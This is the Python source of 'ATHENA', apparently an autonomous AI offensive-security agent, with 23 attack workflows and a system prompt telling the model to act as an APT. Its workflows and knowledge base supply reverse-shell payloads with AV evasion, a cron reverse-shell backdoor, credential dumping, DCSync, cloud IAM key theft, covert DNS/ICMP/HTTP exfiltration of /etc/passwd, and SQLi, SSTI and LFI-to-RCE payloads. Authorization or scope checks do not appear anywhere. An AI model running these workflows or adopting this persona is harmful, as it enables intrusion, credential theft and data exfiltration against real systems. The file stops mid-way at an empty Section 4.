#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║           ATHENA — AI Offensive Security Agent v5.0              ║
║   Bare-metal Kali NetHunter | sdm845 | Phosh UI                  ║
║   Commander: The Priest                                           ║
║   Full expert knowledge base | Elite tradecraft | 23 workflows    ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import subprocess
import re
import datetime

try:
    from groq import Groq
except ImportError:
    print("FATAL: groq not installed. Run: pip install groq")
    sys.exit(1)

try:
    import readline
except ImportError:
    pass

# ─────────────────────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────────────────────

VERSION = "5.0"

BANNER = """\033[35m
 █████╗ ████████╗██╗  ██╗███████╗███╗   ██╗ █████╗
██╔══██╗╚══██╔══╝██║  ██║██╔════╝████╗  ██║██╔══██╗
███████║   ██║   ███████║█████╗  ██╔██╗ ██║███████║
██╔══██║   ██║   ██╔══██║██╔══╝  ██║╚██╗██║██╔══██║
██║  ██║   ██║   ██║  ██║███████╗██║ ╚████║██║  ██║
╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝
\033[0m\033[90m        AI Offensive Security Agent v5.0
           Commander: The Priest | Kali NetHunter
   Elite Knowledge | Full Tradecraft | 23 Workflows\033[0m
"""

INSTALL_DIR = os.path.expanduser("~/.athena")
LOG_DIR     = os.path.join(INSTALL_DIR, "logs")
BOOT_LOCK   = "/tmp/athena_session.lock"

BANNED_COMMANDS = [
    "apt upgrade", "apt full-upgrade",
    "apt-get upgrade", "apt-get full-upgrade", "apt dist-upgrade",
]
BANNED_UPGRADE_PACKAGES = ["phosh", "lightdm", "xfce", "x11", "gnome-shell"]

MAX_HISTORY_MESSAGES = 14
MAX_OUTPUT_CHARS     = 4000
WORKFLOW_DONE        = "WORKFLOW_COMPLETE"

FINDING_PATTERNS = {
    "ip_address":   r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b',
    "open_port":    r'(\d+)/tcp\s+open\s+(\S+)',
    "username":     r'(?:user(?:name)?|login|account)[:\s]+([a-zA-Z0-9_\.\-]{3,})',
    "email":        r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)',
    "hash_ntlm":    r'\b([a-fA-F0-9]{32}:[a-fA-F0-9]{32})\b',
    "hash_generic": r'\b([a-fA-F0-9]{40,64})\b',
    "url":          r'(https?://[^\s\'"<>]{8,})',
    "cve":          r'(CVE-\d{4}-\d+)',
    "credential":   r'(?:password|passwd|pass|pwd)[:\s=]+([^\s\n\r]{4,32})',
    "service_ver":  r'\d+/tcp\s+open\s+\S+\s+(.+?)(?:\n|$)',
    "domain":       r'\b([a-zA-Z0-9\-]+\.[a-zA-Z]{2,})\b',
}

# ─────────────────────────────────────────────────────────────
# ALL 23 WORKFLOWS
# ─────────────────────────────────────────────────────────────

WORKFLOWS = {
    "1": {
        "name": "Network Recon",
        "description": "ARP sweep -> port scan -> service detection -> CVE correlation",
        "prompt": (
            "Begin elite network recon against target: {target}.\n"
            "Phase 1: arp-scan -l to discover live hosts.\n"
            "Phase 2: nmap -sn to ping sweep and confirm live hosts.\n"
            "Phase 3: nmap -sV -sC -p- --min-rate 1000 for full port scan with version detection.\n"
            "Phase 4: nmap -O for OS fingerprinting.\n"
            "Phase 5: searchsploit every service version found.\n"
            "Phase 6: For every open port cross-reference with known high-value attack vectors in your knowledge.\n"
            "After each output analyze in [THOUGHT] using elite pentester reasoning. "
            "Issue one [CMD] at a time. When complete put WORKFLOW_COMPLETE in [CMD]."
        ),
    },
    "2": {
        "name": "Web Enumeration",
        "description": "Full web attack surface mapping with elite tradecraft",
        "prompt": (
            "Begin elite web enumeration against: {target}.\n"
            "Phase 1: whatweb -a 3 for aggressive tech fingerprinting.\n"
            "Phase 2: nikto -h {target} for misconfigurations and known vulns.\n"
            "Phase 3: gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old,zip.\n"
            "Phase 4: Check robots.txt sitemap.xml .env .git/HEAD /.svn backup files.\n"
            "Phase 5: gobuster vhost -u {target} -w /usr/share/wordlists/dirb/common.txt if domain found.\n"
            "Phase 6: searchsploit every identified technology version.\n"
            "Phase 7: Test for SSRF by injecting internal URLs into any parameter that fetches a URL.\n"
            "Phase 8: Check response headers for security misconfigurations.\n"
            "Issue one [CMD] at a time. When complete put WORKFLOW_COMPLETE in [CMD]."
        ),
    },
    "3": {
        "name": "Post-Exploitation",
        "description": "Full post-exploitation with elite LOTL tradecraft",
        "prompt": (
            "Begin elite post-exploitation on current host.\n"
            "Phase 1: id whoami hostname uname -a cat /etc/os-release ip a.\n"
            "Phase 2: sudo -l -- analyze output for GTFOBins exploitation paths.\n"
            "Phase 3: find / -perm -4000 -type f 2>/dev/null -- cross-reference every SUID with GTFOBins.\n"
            "Phase 4: crontab -l and cat /etc/crontab -- look for writable scripts in cron paths.\n"
            "Phase 5: ss -tulnp -- identify internal services not exposed externally.\n"
            "Phase 6: find / -name '*.conf' -o -name '*.ini' -o -name '*.cfg' 2>/dev/null | xargs grep -l 'pass' 2>/dev/null.\n"
            "Phase 7: cat ~/.bash_history -- extract commands that reveal credentials or internal infrastructure.\n"
            "Phase 8: cat /etc/passwd | grep -v nologin -- identify real user accounts.\n"
            "Phase 9: Check for writable paths in /etc/crontab scripts and replace with reverse shell.\n"
            "Issue one [CMD] at a time. Use elite [THOUGHT] reasoning. When complete put WORKFLOW_COMPLETE in [CMD]."
        ),
    },
    "4": {
        "name": "Metasploit Exploit",
        "description": "Validated MSF resource script -> non-interactive execution",
        "prompt": (
            "Run a Metasploit exploit against: {target}.\n"
            "Phase 1: Verify module exists: msfconsole -q -x 'search [keyword]; exit' BEFORE writing script.\n"
            "Phase 2: Write complete resource script to /tmp/athena_msf.rc using tee.\n"
            "Script must have: use [verified_module] set RHOSTS set LHOST set LPORT run exit.\n"
            "LAST LINE MUST BE 'exit'. NEVER use unverified modules.\n"
            "Phase 3: msfconsole -q -r /tmp/athena_msf.rc\n"
            "Phase 4: If session opened immediately run post/multi/recon/local_exploit_suggester.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to explain module selection reasoning."
        ),
    },
    "5": {
        "name": "SQL Injection",
        "description": "sqlmap full auto with elite manual verification",
        "prompt": (
            "Run elite SQL injection assessment against: {target}.\n"
            "Phase 1: Manual test first -- append ' OR '1'='1 to parameters and observe response differences.\n"
            "Phase 2: sqlmap -u {target} --dbs --batch --random-agent --level=3 --risk=2.\n"
            "Phase 3: Dump tables from interesting databases excluding information_schema and mysql.\n"
            "Phase 4: Extract credentials hashes and sensitive PII.\n"
            "Phase 5: Test for --os-shell if MySQL with FILE privilege or MSSQL with xp_cmdshell.\n"
            "Phase 6: Test for --file-read to read server files like /etc/passwd.\n"
            "Phase 7: If credentials found immediately test across all other services in findings.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to explain injection type and pivot logic."
        ),
    },
    "6": {
        "name": "Hash Cracking",
        "description": "hashcat elite -- identify mode crack with multiple attack vectors",
        "prompt": (
            "Crack the hash or capture at: {target}.\n"
            "Phase 1: hashid {target} or hashid [hash] to identify type precisely.\n"
            "Phase 2: Check rockyou.txt exists -- if only .gz gunzip /usr/share/wordlists/rockyou.txt.gz first.\n"
            "Phase 3: hashcat -m [correct_mode] {target} /usr/share/wordlists/rockyou.txt --show first to check cache.\n"
            "Phase 4: If not cached run hashcat -m [mode] {target} /usr/share/wordlists/rockyou.txt.\n"
            "Phase 5: If rockyou fails: hashcat -m [mode] {target} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule.\n"
            "Phase 6: If rules fail: hashcat -m [mode] {target} -a 3 ?u?l?l?l?l?d?d?d for mask attack.\n"
            "Phase 7: If WPA hash try: hashcat -m 22000 {target} /usr/share/wordlists/rockyou.txt.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to explain mode selection."
        ),
    },
    "7": {
        "name": "Password Spraying",
        "description": "Hydra elite credential attacks with lockout awareness",
        "prompt": (
            "Run elite password spraying against: {target}.\n"
            "Phase 1: nmap -sV -p 21,22,23,25,80,110,143,389,443,445,3306,3389,5900,8080 {target}.\n"
            "Phase 2: Check password policy before spraying -- enum4linux or crackmapexec to get lockout threshold.\n"
            "Phase 3: Spray with lockout-safe timing -- max 1 attempt per user per 30 minutes if policy unknown.\n"
            "Phase 4: SSH spray: hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /tmp/top20.txt ssh://{target} -t 4 -W 30.\n"
            "Phase 5: SMB spray: crackmapexec smb {target} -u users.txt -p passwords.txt --continue-on-success.\n"
            "Phase 6: Any valid credentials -- immediately test across all other services in session findings.\n"
            "Phase 7: If domain environment found use crackmapexec with --no-bruteforce for single password spray.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to track attempts and avoid lockout."
        ),
    },
    "8": {
        "name": "Active Directory Recon",
        "description": "Full AD kill chain -- enum to DCSync",
        "prompt": (
            "Run elite Active Directory attack chain against: {target}.\n"
            "Phase 1: enum4linux -a {target} for users groups shares policies.\n"
            "Phase 2: crackmapexec smb {target} --users --groups --shares --pass-pol.\n"
            "Phase 3: impacket-GetADUsers -all -dc-ip {target} domain/user or anonymous.\n"
            "Phase 4: impacket-GetNPUsers -dc-ip {target} -usersfile users.txt -no-pass for AS-REP roasting -- cracks offline.\n"
            "Phase 5: impacket-GetUserSPNs -dc-ip {target} for Kerberoastable SPNs -- cracks offline.\n"
            "Phase 6: If any hashes obtained run hashcat -m 18200 for AS-REP or -m 13100 for Kerberoast.\n"
            "Phase 7: If credentials exist try impacket-secretsdump for DCSync.\n"
            "Phase 8: Check for ADCS with certipy find if available -- ESC1-ESC8 vulnerabilities.\n"
            "Phase 9: Check for Zerologon: nmap -p 445 --script smb-vuln-zerologon {target}.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to map the AD kill chain path."
        ),
    },
    "9": {
        "name": "Payload Generation",
        "description": "msfvenom elite payloads with evasion and staged listener",
        "prompt": (
            "Generate elite attack payloads for: {target}.\n"
            "Phase 1: Detect LHOST: hostname -I | awk '{print $1}'.\n"
            "Phase 2: Windows x64 staged: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=4444 -f exe -e x64/xor_dynamic -i 5 -o /tmp/shell.exe.\n"
            "Phase 3: Windows x64 stageless for AV evasion: msfvenom -p windows/x64/meterpreter_reverse_https LHOST=[LHOST] LPORT=443 -f exe -o /tmp/shell_stageless.exe.\n"
            "Phase 4: Linux ELF: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=4445 -f elf -o /tmp/shell.elf.\n"
            "Phase 5: PHP webshell: msfvenom -p php/meterpreter_reverse_tcp LHOST=[LHOST] LPORT=4446 -f raw -o /tmp/shell.php.\n"
            "Phase 6: Write and launch multi/handler resource script with exit at end.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to select payload for target platform."
        ),
    },
    "10": {
        "name": "Bluetooth Recon",
        "description": "hcitool + sdptool -- BT device discovery and service enum",
        "prompt": (
            "Run Bluetooth reconnaissance. Interface/area: {target}.\n"
            "Phase 1: hciconfig -a to list all Bluetooth interfaces.\n"
            "Phase 2: hcitool scan for classic Bluetooth devices.\n"
            "Phase 3: timeout 15 hcitool lescan for BLE devices.\n"
            "Phase 4: sdptool browse [MAC] for each discovered device.\n"
            "Phase 5: l2ping [MAC] to test connectivity to targets.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to identify attack surface."
        ),
    },
    "11": {
        "name": "OSINT Profiling",
        "description": "Full passive intelligence gathering",
        "prompt": (
            "Run elite OSINT against: {target}.\n"
            "Phase 1: whois {target} for registration data and name servers.\n"
            "Phase 2: dig {target} ANY +noall +answer for all DNS records.\n"
            "Phase 3: theHarvester -d {target} -b google,bing,crtsh,yahoo -l 500.\n"
            "Phase 4: curl -s 'https://crt.sh/?q=%25.{target}&output=json' | python3 -c 'import json,sys;[print(x[\"name_value\"]) for x in json.load(sys.stdin)]' for cert transparency.\n"
            "Phase 5: For every subdomain found -- nmap quick scan to find live ones.\n"
            "Phase 6: Check for exposed .git repos: curl -s {target}/.git/HEAD.\n"
            "Phase 7: Google dork: site:{target} filetype:pdf OR filetype:xls OR filetype:doc.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to map the full attack surface."
        ),
    },
    "12": {
        "name": "SSL/TLS Audit",
        "description": "Full cipher and certificate vulnerability assessment",
        "prompt": (
            "Run full SSL/TLS audit against: {target}.\n"
            "Phase 1: sslscan {target} for protocols ciphers and certificate details.\n"
            "Phase 2: testssl.sh --severity MEDIUM {target} for BEAST POODLE Heartbleed ROBOT CRIME.\n"
            "Phase 3: sslyze --regular {target} for OCSP stapling and session resumption.\n"
            "Phase 4: openssl s_client -connect {target}:443 to inspect certificate chain manually.\n"
            "Phase 5: Check for weak DH params: nmap --script ssl-dh-params {target}.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to explain exploitability of each finding."
        ),
    },
    "13": {
        "name": "DNS Enumeration & Attack",
        "description": "Zone transfer brute-force cache poison check",
        "prompt": (
            "Run elite DNS attack assessment against: {target}.\n"
            "Phase 1: dnsrecon -d {target} -t std for full record enumeration.\n"
            "Phase 2: dnsrecon -d {target} -t axfr to attempt zone transfer.\n"
            "Phase 3: fierce --domain {target} for subdomain brute-force.\n"
            "Phase 4: dnsenum {target} for additional subdomain and host discovery.\n"
            "Phase 5: nmap -p 53 --script dns-recursion {target} to check for open resolver.\n"
            "Phase 6: For all discovered hosts add to target list and fingerprint.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to identify misconfigurations."
        ),
    },
    "14": {
        "name": "SMB Attack",
        "description": "EternalBlue check -> share enum -> relay candidate -> SAM dump",
        "prompt": (
            "Run elite SMB attack chain against: {target}.\n"
            "Phase 1: nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-cve-2020-0796 {target} for EternalBlue and SMBGhost.\n"
            "Phase 2: smbclient -L {target} -N for anonymous share enumeration.\n"
            "Phase 3: crackmapexec smb {target} --shares for share permissions.\n"
            "Phase 4: enum4linux -a {target} for users groups and password policy.\n"
            "Phase 5: Check SMB signing: crackmapexec smb {target} -- if signing false it is relay candidate.\n"
            "Phase 6: If credentials in findings: crackmapexec smb {target} -u [user] -p [pass] --sam.\n"
            "Phase 7: If NTLM hash in findings: crackmapexec smb {target} -u [user] -H [hash] --sam.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to chain into lateral movement."
        ),
    },
    "15": {
        "name": "API Security Testing",
        "description": "Endpoint discovery auth bypass IDOR injection JWT attacks",
        "prompt": (
            "Run elite API security assessment against: {target}.\n"
            "Phase 1: curl -I {target} to fingerprint and check security headers.\n"
            "Phase 2: ffuf -u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,204,301,302,403 -v.\n"
            "Phase 3: arjun -u {target} to discover hidden parameters.\n"
            "Phase 4: Test IDOR -- find any numeric ID in URL or body and increment/decrement to access other users data.\n"
            "Phase 5: Test auth bypass -- send requests without Authorization header or with empty bearer token.\n"
            "Phase 6: If JWT found -- decode with: echo [token] | cut -d. -f2 | base64 -d -- check for alg:none and weak secret.\n"
            "Phase 7: Test for SSRF in any URL parameter: set value to http://169.254.169.254/latest/meta-data/.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to chain vulnerabilities."
        ),
    },
    "16": {
        "name": "Linux Privilege Escalation",
        "description": "linpeas + GTFOBins + kernel exploits -- full root path",
        "prompt": (
            "Run elite Linux privilege escalation on current host.\n"
            "Phase 1: Download linpeas if not present: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lpe.sh && chmod +x /tmp/lpe.sh.\n"
            "Phase 2: /tmp/lpe.sh 2>/dev/null | tee /tmp/lpe_out.txt -- save full output.\n"
            "Phase 3: linux-exploit-suggester 2>/dev/null for kernel CVEs.\n"
            "Phase 4: For every SUID binary found -- check GTFOBins for exploitation method.\n"
            "Phase 5: Check sudo -l -- for any NOPASSWD entry check GTFOBins immediately.\n"
            "Phase 6: Check for writable cron script paths and replace with reverse shell.\n"
            "Phase 7: Check capabilities: getcap -r / 2>/dev/null.\n"
            "Phase 8: Check for docker group: id | grep docker -- if yes instant root via docker run -v /:/mnt.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to prioritize fastest root path."
        ),
    },
    "17": {
        "name": "Windows Privilege Escalation",
        "description": "Full Windows privesc -- services tokens registry UAC",
        "prompt": (
            "Run elite Windows privilege escalation. Target: {target}.\n"
            "Phase 1: systeminfo | findstr /B /C:'OS Name' /C:'OS Version' /C:'Hotfix'.\n"
            "Phase 2: whoami /priv -- if SeImpersonatePrivilege enabled use PrintSpoofer or GodPotato.\n"
            "Phase 3: wmic service get name,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows' for unquoted paths.\n"
            "Phase 4: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated.\n"
            "Phase 5: reg query HKLM\\SYSTEM\\CurrentControlSet\\Services for weak service permissions.\n"
            "Phase 6: cmdkey /list for cached credentials.\n"
            "Phase 7: Check startup folder: dir 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to identify fastest SYSTEM path."
        ),
    },
    "18": {
        "name": "Lateral Movement",
        "description": "Pass-the-hash pass-the-ticket DCSync pivoting",
        "prompt": (
            "Run elite lateral movement from current position toward: {target}.\n"
            "Phase 1: crackmapexec smb {target}/24 with any credentials or hashes from session findings.\n"
            "Phase 2: If NTLM hash available: impacket-psexec [domain]/[user]@{target} -hashes :[hash].\n"
            "Phase 3: impacket-wmiexec as stealth alternative to psexec.\n"
            "Phase 4: impacket-smbexec if psexec and wmiexec are blocked.\n"
            "Phase 5: If Kerberos ticket available: export KRB5CCNAME=[ticket] and use -k flag.\n"
            "Phase 6: For deep pivoting: ssh -D 1080 user@pivot_host then proxychains.\n"
            "Phase 7: If DA credentials found: impacket-secretsdump [domain]/[DA]@[DC_IP] for full DCSync.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to map path and reuse all session findings."
        ),
    },
    "19": {
        "name": "Container & Cloud Escape",
        "description": "Docker escape cloud metadata IAM credential theft",
        "prompt": (
            "Run elite container and cloud escape assessment on: {target}.\n"
            "Phase 1: cat /proc/1/cgroup && cat /.dockerenv 2>/dev/null to confirm container.\n"
            "Phase 2: ls -la /var/run/docker.sock -- if exists instant host escape via docker run.\n"
            "Phase 3: Docker socket escape: docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host.\n"
            "Phase 4: curl -s -m 3 http://169.254.169.254/latest/meta-data/ for AWS IMDS.\n"
            "Phase 5: curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ for IAM role name then dump keys.\n"
            "Phase 6: curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/ for GCP.\n"
            "Phase 7: kubectl auth can-i --list 2>/dev/null for cluster permission enumeration.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to identify and execute escape path."
        ),
    },
    "20": {
        "name": "IDS/IPS Evasion",
        "description": "MAC spoof fragmentation decoys timing -- full stealth recon",
        "prompt": (
            "Run fully evasive reconnaissance against: {target}.\n"
            "Phase 1: ip link show to find interface then macchanger -r [iface] to randomize MAC.\n"
            "Phase 2: nmap -T1 --scan-delay 10s -p 22,80,443,445,3389 {target} for ultra-slow scan.\n"
            "Phase 3: nmap -f --mtu 8 -p 22,80,443 {target} for packet fragmentation.\n"
            "Phase 4: nmap -D RND:15 --data-length 25 {target} for decoys with random padding.\n"
            "Phase 5: nmap --source-port 53 -sU -p 53 {target} to mimic DNS.\n"
            "Phase 6: nmap --source-port 80 {target} to mimic HTTP traffic.\n"
            "Phase 7: Compare all results -- note differences indicating IDS filtering.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to assess stealth at each phase."
        ),
    },
    "21": {
        "name": "Data Exfiltration",
        "description": "DNS HTTP ICMP covert channels -- bypass DLP and firewalls",
        "prompt": (
            "Set up covert exfiltration from compromised host toward: {target}.\n"
            "Phase 1: curl -s https://icanhazip.com and ping 8.8.8.8 -c 2 to test outbound.\n"
            "Phase 2: Test HTTPS outbound: curl -s https://www.google.com -o /dev/null -w '%{http_code}'.\n"
            "Phase 3: HTTP POST exfil: curl -X POST -F 'file=@/etc/passwd' http://{target}/upload.\n"
            "Phase 4: DNS exfil: for chunk in $(cat /etc/passwd | base64 | fold -w 30); do nslookup $chunk.{target}; done.\n"
            "Phase 5: ICMP exfil: ping -p $(xxd -p /etc/passwd | head -c 16) {target} -c 1.\n"
            "Phase 6: If HTTPS allowed -- use curl with custom User-Agent to blend with normal traffic.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to select lowest-detection channel."
        ),
    },
    "22": {
        "name": "Forensics & Evidence Collection",
        "description": "Memory disk firmware analysis with chain of custody",
        "prompt": (
            "Run forensic analysis on: {target}.\n"
            "Phase 1: file {target} and strings {target} | head -200 to identify and extract data.\n"
            "Phase 2: sha256sum {target} for evidence integrity hash -- record this first.\n"
            "Phase 3: binwalk {target} for embedded files and firmware signatures.\n"
            "Phase 4: If memory dump: volatility3 -f {target} windows.info 2>/dev/null || volatility -f {target} imageinfo.\n"
            "Phase 5: Extract process list: volatility3 -f {target} windows.pslist.\n"
            "Phase 6: Extract network connections: volatility3 -f {target} windows.netstat.\n"
            "Phase 7: binwalk -e {target} to carve and extract all embedded files.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to build forensic timeline."
        ),
    },
    "23": {
        "name": "Steganography Analysis",
        "description": "steghide zsteg exiftool binwalk -- find all hidden data",
        "prompt": (
            "Run elite steganography analysis on: {target}.\n"
            "Phase 1: file {target} to confirm file type -- extension may be misleading.\n"
            "Phase 2: exiftool {target} for metadata anomalies and GPS data.\n"
            "Phase 3: strings {target} | grep -iE 'flag|key|pass|secret|htb|thm|root|admin'.\n"
            "Phase 4: steghide extract -sf {target} -p '' for empty passphrase.\n"
            "Phase 5: steghide extract -sf {target} -p 'password' -- try common passwords.\n"
            "Phase 6: zsteg -a {target} for all LSB techniques on PNG/BMP.\n"
            "Phase 7: binwalk -e {target} to extract all appended data.\n"
            "Phase 8: xxd {target} | tail -50 to inspect raw bytes at end of file for appended content.\n"
            "Issue one [CMD] at a time. Use [THOUGHT] to reason from file type to best technique."
        ),
    },
}


# ─────────────────────────────────────────────────────────────
# ELITE KNOWLEDGE BASE — THE BRAIN
# ─────────────────────────────────────────────────────────────

ELITE_KNOWLEDGE = r"""
══════════════════════════════════════════════════════
ATHENA ELITE SECURITY KNOWLEDGE BASE v5.0
══════════════════════════════════════════════════════

You are not a tool runner. You are an elite offensive security operator with
the combined knowledge of a senior penetration tester, red team operator,
exploit developer, and threat intelligence analyst. You think like an APT.
Every decision is deliberate, every command is chosen for a reason.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 1: ELITE MINDSET AND METHODOLOGY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

OBJECTIVE-FIRST THINKING:
Before any command ask: what is the goal, what is the minimum path to it,
what could this action trigger, what is the fallback if it fails.
Never run a command just because it is the next step in a checklist.
Every command must advance the mission.

ATTACK SURFACE THINKING:
Every system has: network exposure, application layer, authentication,
trust relationships, third-party integrations, human factors.
Map all of these before exploiting any of them.
The easiest path is rarely the most obvious one.

TRUST BOUNDARY ANALYSIS:
Ask on every engagement: what trusts what?
A web server trusted by a database is a pivot path.
A service account trusted by Active Directory is a privilege path.
A developer machine trusted by CI/CD is a supply chain path.
Map trust relationships before targeting individual hosts.

DETECTION AWARENESS:
Every action has a noise level. Know it before acting.
LOUD: nmap full scan, hydra brute force, metasploit exploits, mimikatz
MEDIUM: nmap service scan, gobuster, enum4linux, searchsploit queries
QUIET: single curl requests, passive DNS, OSINT, reading files already accessible
SILENT: analyzing output already captured, planning, calculating next move
Choose noise level appropriate to the environment and your objective.

FALLBACK PLANNING:
Always have three approaches for every objective.
If nmap is blocked use masscan. If masscan is blocked use netcat.
If direct exploitation fails use credential attacks.
If credential attacks fail use social engineering paths.
Never have only one plan.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 2: NETWORK RECON ELITE TECHNIQUES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

HOST DISCOVERY WITHOUT NMAP:
  netdiscover -r 192.168.1.0/24          # ARP based discovery
  for i in {1..254}; do ping -c1 -W1 192.168.1.$i &>/dev/null && echo "192.168.1.$i up"; done
  fping -ag 192.168.1.0/24 2>/dev/null   # fast ping sweep

PORT SCANNING ALTERNATIVES:
  masscan -p1-65535 --rate=1000 [IP]     # fastest scanner
  nc -zv [IP] 22 80 443 445 2>&1         # basic netcat check
  nmap -sS -T4 --min-rate 5000 [IP]      # fast SYN scan

SERVICE FINGERPRINTING DEEP:
  nmap -sV --version-intensity 9 [IP]    # maximum version detection
  nmap -A [IP]                           # aggressive: OS + version + scripts + traceroute
  nc -nv [IP] [PORT]                     # manual banner grab
  telnet [IP] [PORT]                     # alternative banner grab

NMAP SCRIPT CATEGORIES TO ALWAYS CONSIDER:
  --script vuln           # all vulnerability scripts
  --script safe           # safe enumeration scripts
  --script auth           # authentication bypass scripts
  --script smb-*          # all SMB scripts
  --script http-*         # all HTTP scripts
  --script ssl-*          # all SSL/TLS scripts
  --script dns-*          # all DNS scripts

FIREWALL AND IDS DETECTION:
  nmap -sA [IP]           # ACK scan to detect filtered vs closed ports
  nmap --reason [IP]      # see why each port is in its state
  nmap -f [IP]            # fragment packets to bypass simple inspection
  hping3 -S -p 80 [IP]    # manual TCP SYN probe

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 3: WEB APPLICATION ELITE TECHNIQUES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MANUAL TESTING BEFORE AUTOMATED TOOLS:
Always manually browse the application first. Automated tools miss:
  - Business logic flaws
  - Multi-step vulnerabilities
  - Context-dependent issues
  - Race conditions

RESPONSE ANALYSIS FRAMEWORK:
Compare responses for: status code changes, body length changes,
response time differences, error message differences, redirect behavior.
A 1ms vs 500ms response difference on login = timing-based user enumeration.
A 200 vs 302 on admin path with tampered cookie = auth bypass.

INJECTION POINTS TO TEST MANUALLY:
  Every URL parameter: ?id=1 ?user=admin ?page=home
  Every form field including hidden fields
  Every HTTP header: User-Agent Referer X-Forwarded-For Cookie
  Every JSON/XML body field
  File upload filenames and content types

SQL INJECTION CHEAT SHEET:
  Basic test: ' OR '1'='1'--
  Time-based: ' OR SLEEP(5)--   (MySQL)  ' OR pg_sleep(5)--  (Postgres)
  Error-based: ' AND extractvalue(1,concat(0x7e,version()))--
  UNION: ' UNION SELECT NULL,NULL,NULL--  (increment NULLs until no error)
  File read MySQL: ' UNION SELECT load_file('/etc/passwd'),NULL--
  File write MySQL: ' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php'--

XSS PAYLOADS THAT BYPASS FILTERS:
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  javascript:alert(1)
  <iframe srcdoc='<script>alert(1)</script>'>
  "><script>alert(1)</script>
  ';alert(1)//

SSRF TARGETS WORTH HITTING:
  http://169.254.169.254/latest/meta-data/                    AWS
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://metadata.google.internal/computeMetadata/v1/         GCP
  http://169.254.169.254/metadata/instance                    Azure
  http://localhost:8080  http://127.0.0.1:22  http://[::1]:80  Internal services

LFI TO RCE ESCALATION PATH:
  Step 1: Confirm LFI with /etc/passwd
  Step 2: Read /proc/self/environ for environment variables
  Step 3: Read Apache/Nginx logs via /var/log/apache2/access.log
  Step 4: Inject PHP into User-Agent: <?php system($_GET['cmd']); ?>
  Step 5: Include the log file with cmd parameter: ?page=../log&cmd=id
  Step 6: Upload PHP shell if file upload exists

XXE PAYLOAD:
  <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>

TEMPLATE INJECTION DETECTION:
  Test: {{7*7}}  ${7*7}  <%= 7*7 %>  #{7*7}  *{7*7}
  If response contains 49 -- template injection confirmed
  Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  Twig RCE: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

JWT ATTACKS:
  Decode: echo [header.payload.sig] | cut -d. -f1-2 | base64 -d
  None algorithm: change alg to "none" remove signature keep trailing dot
  Weak secret brute: hashcat -a 0 -m 16500 [token] /usr/share/wordlists/rockyou.txt
  Key confusion: if RS256 sign with public key as HS256 secret

OAUTH ATTACKS:
  Redirect URI bypass: add @attacker.com or use attacker.com%2fetarget.com
  State parameter missing: CSRF to steal auth code
  Implicit flow token theft: steal access_token from URL fragment

DESERIALIZATION FINGERPRINTING:
  Java: rO0 in base64 or 0xACED in hex = Java serialized object
  PHP: O:4:"User":1: = PHP object notation
  Python: gASV = pickle data
  Tool: ysoserial for Java, phpggc for PHP

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECTION 4: ACTIVE DIRECTORY ELITE KILL CHAINS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

